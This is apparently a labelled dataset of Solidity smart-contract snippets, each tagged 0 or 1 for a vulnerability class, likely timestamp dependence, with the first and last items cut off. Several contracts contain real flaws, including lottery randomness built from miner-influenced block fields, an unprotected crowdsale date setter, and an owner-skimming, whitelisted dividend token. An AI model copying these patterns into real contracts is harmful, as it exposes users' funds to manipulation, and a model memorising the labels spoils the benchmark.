uint256 _amount) private {        require(now < finishTime && _amount >= BUY_AMOUNT_MIN && _amount <= BUY_AMOUNT_MAX);                 uint256 _day = (now / 86400) * 86400;        uint256 _backEth = 0;        uint256 _eth = _amount;        if (totalPot < 200000000000000000000) {                         if (_eth >= 5000000000000000000) {                                 _backEth = _eth.sub(5000000000000000000);                _eth = 5000000000000000000;            }        }        txCount = txCount + 1;          _buyEvent.flag1 += txCount * 10;          _player.ethTotal = _player.ethTotal.add(_eth);        totalPot = totalPot.add(_eth);                 uint256 _newTotalSupply = calculateTotalSupply(totalPot);                 uint256 _tokenAmount = _newTotalSupply.sub(totalSupply);        _player.tokenBalance = _player.tokenBalance.add(_tokenAmount);                          if (_player.tokenDay == _day) {            _player.tokenDayBalance = _player.tokenDayBalance.add(_tokenAmount);        } else {            _player.tokenDay = _day;            _player.tokenDayBalance = _tokenAmount;        }                 updatePrice(_newTotalSupply);        handlePot(_day, _eth, _newTotalSupply, _tokenAmount, _player, _buyEvent);        if (_backEth > 0) {            _player.ethBalance = _player.ethBalance.add(_backEth);        }        sendFeeIfAvailable();        emitEndTxEvents(_eth, _tokenAmount, _buyEvent);    }         function handlePot(uint256 _day, uint256 _eth, uint256 _newTotalSupply, uint256 _tokenAmount, Player storage _player, InternalBuyEvent memory _buyEvent) private {        uint256 _sharePotDelta = _eth.div(2);          uint256 _finalPotDelta = _eth.div(5);          uint256 _luckyPotDelta = _eth.mul(255).div(1000);          uint256 _dealerPotDelta = _eth.sub(_sharePotDelta).sub(_finalPotDelta).sub(_luckyPotDelta);          sharePot = sharePot.add(_sharePotDelta);        finalPot = finalPot.add(_finalPotDelta);        luckyPot = luckyPot.add(_luckyPotDelta);        totalSupply = _newTotalSupply;        handleDealerPot(_day, _dealerPotDelta, _player, _buyEvent);        handleLuckyPot(_eth, _player);                 if (_tokenAmount >= ONE_TOKEN) {            updateFinishTime(_tokenAmount);            lastPlayer = msg.sender;        }        _buyEvent.flag1 += finishTime * 1000000000000000000000;      }         function handleLuckyPot(uint256 _eth, Player storage _player) private {        uint256 _seed = uint256(keccak256(abi.encodePacked(                (block.timestamp).add                (block.difficulty).add                ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add                (block.gaslimit).add                ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add                (block.number)            )));        _seed = _seed - ((_seed / 1000) * 1000);        uint64 _level = 0;        if (_seed < 227) {              _level = 1;        } else if (_seed < 422) {              _level = 2;        } else if (_seed < 519) {              _level = 3;        } else if (_seed < 600) {              _level = 4;        } else if (_seed < 700) {              _level = 5;        } else {               _level = 6;        }        if (_level >= 5) {                         handleLuckyReward(txCount, _level, _eth, _player);        } else {                         LuckyPending memory _pending = LuckyPending({                player: msg.sender,                amount: _eth,                txId: txCount,                block: uint64(block.number + 1),                level: _level                });            luckyPendings.push(_pending);        }                 handleLuckyPending(_level >= 5 ? 0 : 1);    }    function handleLuckyPending(uint256 _pendingSkipSize) private {        if (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {            LuckyPending storage _pending = luckyPendings[luckyPendingIndex];            if (_pending.block <= block.number) {                uint256 _seed = uint256(keccak256(abi.encodePacked(                        (block.timestamp).add                        (block.difficulty).add                        ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add                        (block.gaslimit).add                        (block.number)                    )));                _seed = _seed - ((_seed / 1000) * 1000);                handleLucyPendingForOne(_pending, _seed);                if (luckyPendingIndex < luckyPendings.length - _pendingSkipSize) {                    _pending = luckyPendings[luckyPendingIndex];                    if (_pending.block <= block.number) {                        handleLucyPendingForOne(_pending, _seed);                    }                }            }        }    }    function handleLucyPendingForOne(LuckyPending storage _pending, uint256 _seed) private {        luckyPendingIndex = luckyPendingIndex.add(1);        bool _reward = false;        if (_pending.level == 4) {            _reward = _seed < 617;        } else if (_pending.level == 3) {            _reward = _seed < 309;        } else if (_pending.level == 2) {            _reward = _seed < 102;        } else if (_pending.level == 1) {            _reward = _seed < 44;        }        if (_reward) {            handleLuckyReward(_pending.txId, _pending.level, _pending.amount, playerOf[_pending.player]);        }    }    function handleLuckyReward(uint64 _txId, uint64 _level, uint256 _eth, Player storage _player) private {        uint256 _amount;        if (_level == 1) {            _amount = _eth.mul(7);          } else if (_level == 2) {            _amount = _eth.mul(3);          } else if (_level == 3) {            _amount = _eth;                 } else if (_level == 4) {            _amount = _eth.div(2);          } else if (_level == 5) {            _amount = _eth.div(5);          } else if (_level == 6) {            _amount = _eth.div(10);          }        uint256 _maxPot = luckyPot.div(2);        if (_amount > _maxPot) {            _amount = _maxPot;        }        luckyPot = luckyPot.sub(_amount);        _player.ethBalance = _player.ethBalance.add(_amount);        LuckyRecord memory _record = LuckyRecord({            player: msg.sender,            amount: _amount,            txId: _txId,            level: _level,            time: uint64(now)            });        luckyRecords.push(_record);    }         function handleDealerPot(uint256 _day, uint256 _dealerPotDelta, Player storage _player, InternalBuyEvent memory _buyEvent) private {        uint256 _potUnit = _dealerPotDelta.div(dealers.length);                 if (dealerDay != _day || dealers[0] == address(0)) {            dealerDay = _day;            dealers[0] = msg.sender;            dealers[1] = address(0);            dealers[2] = address(0);            _player.ethBalance = _player.ethBalance.add(_potUnit);            feeAmount = feeAmount.add(_dealerPotDelta.sub(_potUnit));            _buyEvent.flag1 += _player.pid * 100000000000000000000000000000000;              return;        }                 for (uint256 _i = 0; _i < dealers.length; ++_i) {            if (dealers[_i] == address(0)) {                dealers[_i] = msg.sender;                break;            }            if (dealers[_i] == msg.sender) {                break;            }            Player storage _dealer = playerOf[dealers[_i]];            if (_dealer.tokenDayBalance < _player.tokenDayBalance) {                for (uint256 _j = dealers.length - 1; _j > _i; --_j) {                    if (dealers[_j - 1] != msg.sender) {                        dealers[_j] = dealers[_j - 1];                    }                }                dealers[_i] = msg.sender;                break;            }        }                 uint256 _fee = _dealerPotDelta;        for (_i = 0; _i < dealers.length; ++_i) {            if (dealers[_i] == address(0)) {                break;            }            _dealer = playerOf[dealers[_i]];            _dealer.ethBalance = _dealer.ethBalance.add(_potUnit);            _fee = _fee.sub(_potUnit);            _buyEvent.flag1 += _dealer.pid *            (_i == 0 ? 100000000000000000000000000000000 :            (_i == 1 ? 100000000000000000000000000000000000000000000000 :            (_i == 2 ? 100000000000000000000000000000000000000000000000000000000000000 : 0)));          }        if (_fee > 0) {            feeAmount = feeAmount.add(_fee);        }    }    function emitEndTxEvents(uint256 _eth, uint256 _tokenAmount, InternalBuyEvent memory _buyEvent) private {        emit Transfer(address(this), msg.sender, _tokenAmount);        emit Buy(            address(this), msg.sender, _eth, _tokenAmount,            totalSupply, totalPot, sharePot, finalPot, luckyPot,            price, _buyEvent.flag1        );    }         function endGame() private {                 if (luckyPot > 0) {            feeAmount = feeAmount.add(luckyPot);            luckyPot = 0;        }                          if (winner == address(0) && lastPlayer != address(0)) {            winner = lastPlayer;            lastPlayer = address(0);            winAmount = finalPot;            finalPot = 0;            Player storage _player = playerOf[winner];            _player.ethBalance = _player.ethBalance.add(winAmount);            emit Win(address(this), winner, winAmount);        }    }         function updateFinishTime(uint256 _tokenAmount) private {        uint256 _timeDelta = _tokenAmount.div(ONE_TOKEN).mul(TIME_DURATION_INCREASE);        uint256 _finishTime = finishTime.add(_timeDelta);        uint256 _maxTime = now.add(TIME_DURATION_MAX);        finishTime = _finishTime <= _maxTime ? _finishTime : _maxTime;    }    function updatePrice(uint256 _newTotalSupply) private {        price = _newTotalSupply.mul(2).div(10000000000).add(88000000000000);        uint256 _idx = feeIndex + 1;        while (_idx < feePrices.length && price >= feePrices[_idx]) {            feeIndex = _idx;            ++_idx;        }    }    function calculateTotalSupply(uint256 _newTotalPot) private pure returns(uint256) {        return _newTotalPot.mul(10000000000000000000000000000)        .add(193600000000000000000000000000000000000000000000)        .sqrt()        .sub(440000000000000000000000);    }    function sendFeeIfAvailable() private {        if (feeAmount > 1000000000000000000) {            feeOwner.transfer(feeAmount);            feeAmount = 0;        }    }         function changeFeeOwner(address _feeOwner) onlyOwner public {        require(_feeOwner != feeOwner && _feeOwner != address(0));        feeOwner = _feeOwner;    }         function withdrawFee(uint256 _amount) onlyOwner public {        require(now >= finishTime.add(30 days));        if (winner == address(0)) {            endGame();        }        feeAmount = feeAmount > _amount ? feeAmount.sub(_amount) : 0;        feeOwner.transfer(_amount);    }}
0<CODESPLIT>contract EVOLUTION2 {              modifier onlyBagholders() {        require(myTokens() > 0);        _;    }             modifier onlyStronghands() {        require(myDividends(true) > 0);        _;    }                                                     modifier onlyAdministrator(){        require(msg.sender == investor);        _;    }             event onTokenPurchase(        address indexed customerAddress,        uint256 incomingEthereum,        uint256 tokensMinted,        address indexed referredBy    );        event onTokenSell(        address indexed customerAddress,        uint256 tokensBurned,        uint256 ethereumEarned    );        event onReinvestment(        address indexed customerAddress,        uint256 ethereumReinvested,        uint256 tokensMinted    );        event onWithdraw(        address indexed customerAddress,        uint256 ethereumWithdrawn    );    event OnRedistribution (          uint256 amount,        uint256 timestamp    );             event Transfer(        address indexed from,        address indexed to,        uint256 tokens    );                 string public name = "EVO2";      string public symbol = "EVO2";      uint8 constant public decimals = 18;    uint8 constant internal dividendFee_ = 10;    uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;    uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;    uint256 constant internal magnitude = 2**64;             uint256 public stakingRequirement = 5e18;                         mapping(address => uint256) internal tokenBalanceLedger_;    mapping(address => uint256) internal referralBalance_;    mapping(address => int256) internal payoutsTo_;    uint256 internal tokenSupply_ = 0;    uint256 internal profitPerShare_;    mapping(address => bool) internal whitelisted_;      bool internal whitelist_ = true;          address public investor;                  constructor()        public    {        investor = 0x8e97F9338460B0d33BD6452A558Ae43284805B5C;          whitelisted_[0x8e97F9338460B0d33BD6452A558Ae43284805B5C] = true;      }             function buy(address _referredBy)        public        payable        returns(uint256)    {        purchaseTokens(msg.value, _referredBy);    }             function()        payable        public    {        purchaseTokens(msg.value, 0x0);    }             function reinvest()        onlyStronghands()        public    {                 uint256 _dividends = myDividends(false);                           address _customerAddress = msg.sender;        payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         uint256 _tokens = purchaseTokens(_dividends, 0x0);                         emit onReinvestment(_customerAddress, _dividends, _tokens);    }             function exit()        public    {                 address _customerAddress = msg.sender;        uint256 _tokens = tokenBalanceLedger_[_customerAddress];        if(_tokens > 0) sell(_tokens);                         withdraw();    }         function withdraw()        onlyStronghands()        public    {                 address _customerAddress = msg.sender;        uint256 _dividends = myDividends(false);                           payoutsTo_[_customerAddress] +=  (int256) (_dividends * magnitude);                         _dividends += referralBalance_[_customerAddress];        referralBalance_[_customerAddress] = 0;                         _customerAddress.transfer(_dividends);                         emit onWithdraw(_customerAddress, _dividends);    }             function sell(uint256 _amountOfTokens)        onlyBagholders()        public    {                 address _customerAddress = msg.sender;                 require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);        uint256 _tokens = _amountOfTokens;        uint256 _ethereum = tokensToEthereum_(_tokens);        uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);        uint256 _investmentEth = SafeMath.div(_ethereum, 20);          uint256 _taxedEthereum = SafeMath.sub(_ethereum, (_dividends+_investmentEth));                investor.transfer(_investmentEth);                   tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);                         int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));        payoutsTo_[_customerAddress] -= _updatedPayouts;                                if (tokenSupply_ > 0) {                         profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);        }                         emit onTokenSell(_customerAddress, _tokens, _taxedEthereum);    }              function transfer(address _toAddress, uint256 _amountOfTokens)        onlyBagholders()        public        returns(bool)    {                 address _customerAddress = msg.sender;                         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);                         if(myDividends(true) > 0) withdraw();                 tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);                         payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);        payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _amountOfTokens);                         emit Transfer(_customerAddress, _toAddress, _amountOfTokens);                         return true;           }         function redistribution()        external        payable    {                 uint256 ethereum = msg.value;                         profitPerShare_ = SafeMath.add(profitPerShare_, (ethereum * magnitude) / tokenSupply_);                         emit OnRedistribution(ethereum, block.timestamp);             }             function setAdministrator(address _newInvestor)        onlyAdministrator()        external    {        investor = _newInvestor;    }             function setStakingRequirement(uint256 _amountOfTokens)        onlyAdministrator()        public    {        stakingRequirement = _amountOfTokens;    }             function setName(string _name)        onlyAdministrator()        public    {        name = _name;    }             function setSymbol(string _symbol)        onlyAdministrator()        public    {        symbol = _symbol;    }                  function totalEthereumBalance()        public        view        returns(uint)    {        return address(this).balance;    }             function totalSupply()        public        view        returns(uint256)    {        return tokenSupply_;    }             function myTokens()        public        view        returns(uint256)    {        address _customerAddress = msg.sender;        return balanceOf(_customerAddress);    }              function myDividends(bool _includeReferralBonus)         public         view         returns(uint256)    {        address _customerAddress = msg.sender;        return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;    }             function balanceOf(address _customerAddress)        view        public        returns(uint256)    {        return tokenBalanceLedger_[_customerAddress];    }             function dividendsOf(address _customerAddress)        view        public        returns(uint256)    {        return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;    }             function sellPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ - tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );            uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);            return _taxedEthereum;        }    }             function buyPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ + tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );            uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);            return _taxedEthereum;        }    }             function calculateTokensReceived(uint256 _ethereumToSpend)         public         view         returns(uint256)    {        uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);                return _amountOfTokens;    }             function calculateEthereumReceived(uint256 _tokensToSell)         public         view         returns(uint256)    {        require(_tokensToSell <= tokenSupply_);        uint256 _ethereum = tokensToEthereum_(_tokensToSell);        uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);        return _taxedEthereum;    }        function disableWhitelist() external {        require(whitelisted_[msg.sender] == true);        whitelist_ = false;    }    function activateWhitelist() external {        require(whitelisted_[msg.sender] == true);        whitelist_ = true;    }         function purchaseTokens(uint256 _incomingEthereum, address _referredBy)        internal        returns(uint256)    {                                     if (whitelisted_[msg.sender] == false && whitelist_ == true) {             revert();        }                 address _customerAddress = msg.sender;        uint256 _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);        uint256 _investmentEth = SafeMath.div(_incomingEthereum, 20);          uint256 _referralBonus = SafeMath.div(_undividedDividends, 3);        uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);        uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, (_undividedDividends+_investmentEth));        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);        uint256 _fee = _dividends * magnitude;        investor.transfer(_investmentEth);                                              require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));                         if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                                  tokenBalanceLedger_[_referredBy] >= stakingRequirement        ){                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);        } else {                                      _dividends = SafeMath.add(_dividends, _referralBonus);            _fee = _dividends * magnitude;        }                         if(tokenSupply_ > 0){                                     tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);                          profitPerShare_ += (_dividends * magnitude / (tokenSupply_));                                     _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));                } else {                         tokenSupply_ = _amountOfTokens;        }                         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);                                  int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);        payoutsTo_[_customerAddress] += _updatedPayouts;                         emit onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);                return _amountOfTokens;    }         function ethereumToTokens_(uint256 _ethereum)        internal        view        returns(uint256)    {        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;        uint256 _tokensReceived =          (            (                                 SafeMath.sub(                    (sqrt                        (                            (_tokenPriceInitial**2)                            +                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))                            +                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))                            +                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)                        )                    ), _tokenPriceInitial                )            )/(tokenPriceIncremental_)        )-(tokenSupply_)        ;          return _tokensReceived;    }              function tokensToEthereum_(uint256 _tokens)        internal        view        returns(uint256)    {        uint256 tokens_ = (_tokens + 1e18);        uint256 _tokenSupply = (tokenSupply_ + 1e18);        uint256 _etherReceived =        (                         SafeMath.sub(                (                    (                        (                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))                        )-tokenPriceIncremental_                    )*(tokens_ - 1e18)                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2            )        /1e18);        return _etherReceived;    }                      function sqrt(uint x) internal pure returns (uint y) {        uint z = (x + 1) / 2;        y = x;        while (z < y) {            y = z;            z = (x / z + z) / 2;        }    }} library SafeMath {         function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }         function div(uint256 a, uint256 b) internal pure returns (uint256) {                 uint256 c = a / b;                 return c;    }         function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }         function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        return c;    }}
1<CODESPLIT>contract GameState{    uint256[3] RoundTimes = [(5 minutes), (20 minutes), (10 minutes)];    uint256 public CurrentGame = 0;    uint256 public Timestamp = 0;    function Start() internal {        Timestamp = block.timestamp + RoundTimes[CurrentGame];        return;    }}
0<CODESPLIT>contract MyToken {    mapping (address => uint256) public balanceOf;    mapping (address => uint256) public restFinish;    function rest()  returns (bool success){            require(balanceOf[msg.sender] >= 5000);                  balanceOf[msg.sender] -= 5000;        restFinish[msg.sender] = block.timestamp + 3 days;        return true;     }}
1<CODESPLIT>contract BlockportCrowdsale {    uint256 public startTime;    function setCrowdsaleDates(uint256 _startTime, uint256 _endTime) public returns (bool) {        require(startTime > block.timestamp);        startTime = _startTime;        return true;    }}
0<CODESPLIT>contract ReentrancyGuard {     bool private reentrancyLock = false;     modifier nonReentrant() {    require(!reentrancyLock);    reentrancyLock = true;    _;    reentrancyLock = false;  }} 
0<CODESPLIT>contract Claimable is Ownable {  address public pendingOwner;     modifier onlyPendingOwner() {    require(msg.sender == pendingOwner);    _;  }     function transferOwnership(address newOwner) onlyOwner public {    pendingOwner = newOwner;  }     function claimOwnership() onlyPendingOwner public {    emit OwnershipTransferred(owner, pendingOwner);    owner = pendingOwner;    pendingOwner = address(0);  }}
0<CODESPLIT>contract Operational is Claimable {    address public operator;    function Operational(address _operator) public {      operator = _operator;    }    modifier onlyOperator() {      require(msg.sender == operator);      _;    }    function transferOperator(address newOperator) public onlyOwner {      require(newOperator != address(0));      operator = newOperator;    }}
1<CODESPLIT>contract YunMint is Operational, ReentrancyGuard, BurnableToken, StandardToken {    using SafeMath for uint;    using SafeMath for uint256;    using DateTime for uint256;    event Release(address operator, uint256 value, uint256 releaseTime);    event Burn(address indexed burner, uint256 value);    event Freeze(address indexed owner, uint256 value, uint256 releaseTime);    event Unfreeze(address indexed owner, uint256 value, uint256 releaseTime);    struct FrozenBalance {address owner; uint256 value; uint256 unFrozenTime;}    mapping (uint => FrozenBalance) public frozenBalances;    uint public frozenBalanceCount = 0;         uint256 constant valueTotal = 303000000 * (10 ** 8);         uint256 public releasedSupply;    uint    public releasedCount = 0;    uint    public cycleCount = 0;    uint256 public firstReleaseAmount;    uint256 public curReleaseAmount;    uint256 public createTime = 0;    uint256 public lastReleaseTime = 0;    modifier validAddress(address _address) {        assert(0x0 != _address);        _;    }    function YunMint(address _operator) public validAddress(_operator) Operational(_operator) {        createTime = block.timestamp;        totalSupply_ = valueTotal;        firstReleaseAmount = 200000 * (10 ** 8);    }    function batchTransfer(address[] _to, uint256[] _amount) public returns(bool success) {        for(uint i = 0; i < _to.length; i++){            require(transfer(_to[i], _amount[i]));        }        return true;    }    function release(uint256 timestamp) public onlyOperator returns(bool) {        require(timestamp <= block.timestamp);        if(lastReleaseTime > 0){            require(timestamp > lastReleaseTime);        }        require(!hasItBeenReleased(timestamp));        cycleCount = releasedCount.div(30);        require(cycleCount < 100);        require(releasedSupply < valueTotal);        curReleaseAmount = firstReleaseAmount - (cycleCount * 2000 * (10 ** 8));        balances[owner] = balances[owner].add(curReleaseAmount);        releasedSupply = releasedSupply.add(curReleaseAmount);        lastReleaseTime = timestamp;        releasedCount = releasedCount + 1;        emit Release(msg.sender, curReleaseAmount, lastReleaseTime);        emit Transfer(address(0), owner, curReleaseAmount);        return true;    }    function hasItBeenReleased(uint256 timestamp) internal view returns(bool _exist) {        bool exist = false;        if ((lastReleaseTime.parseTimestamp().year == timestamp.parseTimestamp().year)            && (lastReleaseTime.parseTimestamp().month == timestamp.parseTimestamp().month)            && (lastReleaseTime.parseTimestamp().day == timestamp.parseTimestamp().day)) {            exist = true;        }        return exist;    }    function freeze(uint256 _value, uint256 _unFrozenTime) nonReentrant public returns (bool) {        require(balances[msg.sender] >= _value);        require(_unFrozenTime > createTime);        require(_unFrozenTime > block.timestamp);        balances[msg.sender] = balances[msg.sender].sub(_value);        frozenBalances[frozenBalanceCount] = FrozenBalance({owner: msg.sender, value: _value, unFrozenTime: _unFrozenTime});        frozenBalanceCount++;        emit Freeze(msg.sender, _value, _unFrozenTime);        return true;    }    function frozenBalanceOf(address _owner) constant public returns (uint256 value) {        for (uint i = 0; i < frozenBalanceCount; i++) {            FrozenBalance storage frozenBalance = frozenBalances[i];            if (_owner == frozenBalance.owner) {                value = value.add(frozenBalance.value);            }        }        return value;    }    function unfreeze() public returns (uint256 releaseAmount) {        uint index = 0;        while (index < frozenBalanceCount) {            if (now >= frozenBalances[index].unFrozenTime) {                releaseAmount += frozenBalances[index].value;                unFrozenBalanceByIndex(index);            } else {                index++;            }        }        return releaseAmount;    }    function unFrozenBalanceByIndex(uint index) internal {        FrozenBalance storage frozenBalance = frozenBalances[index];        balances[frozenBalance.owner] = balances[frozenBalance.owner].add(frozenBalance.value);        emit Unfreeze(frozenBalance.owner, frozenBalance.value, frozenBalance.unFrozenTime);        frozenBalances[index] = frozenBalances[frozenBalanceCount - 1];        delete frozenBalances[frozenBalanceCount - 1];        frozenBalanceCount--;    }}
0<CODESPLIT>contract YunToken is YunMint {    string public standard = '2018062301';    string public name = 'YunToken';    string public symbol = 'YUN';    uint8 public decimals = 8;    function YunToken(address _operator) YunMint(_operator) public {}}
1<CODESPLIT>contract SnooKarma {             address public oracle;                  address public maintainer;             address public owner;                  mapping(address => uint) public balanceOf;    mapping(address => mapping (address => uint)) public allowance;    string public constant symbol = "SNK";    string public constant name = "SnooKarma";    uint8 public constant decimals = 2;    uint public totalSupply = 0;    event Transfer(address indexed _from, address indexed _to, uint _value);    event Approval(address indexed _owner, address indexed _spender, uint _value);            event Redeem(string indexed username, address indexed addr, uint karma);               mapping(string => uint) redeemedKarma;             constructor() public {        owner = msg.sender;        maintainer = msg.sender;        oracle = msg.sender;    }                  function transfer(address destination, uint amount) public returns (bool success) {        if (balanceOf[msg.sender] >= amount &&             balanceOf[destination] + amount > balanceOf[destination]) {            balanceOf[msg.sender] -= amount;            balanceOf[destination] += amount;            emit Transfer(msg.sender, destination, amount);            return true;        } else {            return false;        }    }     function transferFrom (        address from,        address to,        uint amount    ) public returns (bool success) {        if (balanceOf[from] >= amount &&            allowance[from][msg.sender] >= amount &&            balanceOf[to] + amount > balanceOf[to])         {            balanceOf[from] -= amount;            allowance[from][msg.sender] -= amount;            balanceOf[to] += amount;            emit Transfer(from, to, amount);            return true;        } else {            return false;        }    }     function approve(address spender, uint amount) public returns (bool success) {        allowance[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }                       function safeAdd(uint a, uint b) internal pure returns (uint) {        uint c = a + b;        require(c >= a);        return c;    }             modifier onlyBy(address account) {        require(msg.sender == account);        _;    }             function transferOwnership(address newOwner) public onlyBy(owner) {        require(newOwner != address(0));        owner = newOwner;    }                  function changeOracle(address newOracle) public onlyBy(owner) {        require(oracle != address(0) && newOracle != address(0));        oracle = newOracle;    }              function removeOracle() public onlyBy(owner) {        oracle = address(0);    }             function changeMaintainer(address newMaintainer) public onlyBy(owner) {        maintainer = newMaintainer;    }                       function redeem(string username, uint karma, uint sigExp, uint8 sigV, bytes32 sigR, bytes32 sigS) public {                 require(            ecrecover(                keccak256(abi.encodePacked(this, username, karma, sigExp)),                sigV, sigR, sigS            ) == oracle        );                 require(block.timestamp < sigExp);                 require(karma > redeemedKarma[username]);                 uint newUserKarma = karma - redeemedKarma[username];                 balanceOf[msg.sender] = safeAdd(balanceOf[msg.sender], newUserKarma);                 uint newMaintainerKarma = newUserKarma / 100;                 balanceOf[maintainer] = safeAdd(balanceOf[maintainer], newMaintainerKarma);                 totalSupply = safeAdd(totalSupply, safeAdd(newUserKarma, newMaintainerKarma));                 redeemedKarma[username] = karma;                 emit Redeem(username, msg.sender, newUserKarma);                 emit Transfer(0x0, msg.sender, newUserKarma);    }                  function redeemedKarmaOf(string username) public view returns(uint) {        return redeemedKarma[username];    }             function() public payable {  }             function transferEthereum(uint amount, address destination) public onlyBy(maintainer) {        require(destination != address(0));        destination.transfer(amount);    }         function transferTokens(address token, uint amount, address destination) public onlyBy(maintainer) {        require(destination != address(0));        SnooKarma tokenContract = SnooKarma(token);        tokenContract.transfer(destination, amount);    } }
0<CODESPLIT>contract TokenVestingFactory is Claimable {    event Created(VariableRateTokenVesting vesting);    function create(        address _beneficiary,        uint256 _start,        uint256[] _cumulativeRates,        uint256 _interval    ) onlyOwner public returns (VariableRateTokenVesting)    {        VariableRateTokenVesting vesting = new VariableRateTokenVesting(            _beneficiary, _start, _cumulativeRates, _interval);        emit Created(vesting);        return vesting;    }}
0<CODESPLIT>contract VariableRateTokenVesting is TokenVesting {    using SafeMath for uint256;    using SafeERC20 for ERC20Basic;              uint256[] public cumulativeRates;         uint256 public interval;    constructor(        address _beneficiary,        uint256 _start,        uint256[] _cumulativeRates,        uint256 _interval    ) public                 TokenVesting(_beneficiary, _start,  0,  ~uint256(0), true)    {                 for (uint256 i = 0; i < _cumulativeRates.length; ++i) {            require(_cumulativeRates[i] <= 100);            if (i > 0) {                require(_cumulativeRates[i] >= _cumulativeRates[i - 1]);            }        }        cumulativeRates = _cumulativeRates;        interval = _interval;                 owner = 0x0298CF0d5B60a0aD885518adCB4c3fc49b36D347;    }         function vestedAmount(ERC20Basic token) public view returns (uint256) {        if (now < start) {            return 0;        }        uint256 currentBalance = token.balanceOf(this);        uint256 totalBalance = currentBalance.add(released[token]);        uint256 timeSinceStart = now.sub(start);        uint256 currentPeriod = timeSinceStart.div(interval);        if (currentPeriod >= cumulativeRates.length) {            return totalBalance;        }        return totalBalance.mul(cumulativeRates[currentPeriod]).div(100);    }}
0<CODESPLIT>contract JungleScratch is Owned {    using SafeMath for uint;    uint public LimitBottom = 0.02 ether;    uint public LimitTop = 0.1 ether;        address public Drawer;    struct Game {        bytes32 SecretKey_P;        bool isPlay;        bool isPay;        uint Result;        uint Time;        address Buyer;        uint value;    }        mapping (bytes32 => Game) public TicketPool;        event SubmitTicket(bytes32 indexed SecretKey_D_hash, uint Bet_amount,bytes32 SecretKey_P, address Player);       event Result(bytes32 SecretKey_D_hash, bytes32 SecretKey_D,address Buyer, uint[] Bird_Result, uint Game_Result, uint time);    event Pay(bytes32 indexed SecretKey_D_hash, address indexed Buyer, uint Game_Result);    event Owe(bytes32 indexed SecretKey_D_hash, address indexed Buyer, uint Game_Result);    event OwePay(bytes32 indexed SecretKey_D_hash, address indexed Buyer, uint Game_Result);        function JungleScratch (address drawer_) public {        Drawer = drawer_;    }        function submit(bytes32 secretKey_P, bytes32 secretKey_D_hash) payable public {        require(msg.value == 0.02 ether || msg.value == 0.04 ether || msg.value == 0.06 ether || msg.value == 0.08 ether || msg.value == 0.1 ether);        require(TicketPool[secretKey_D_hash].Time == 0);        require(msg.value >= LimitBottom && msg.value <= LimitTop);        uint check = msg.value.div(20000000000000000);        require(check == 1 || check == 2 || check == 3 || check == 4 || check == 5);                SubmitTicket(secretKey_D_hash, 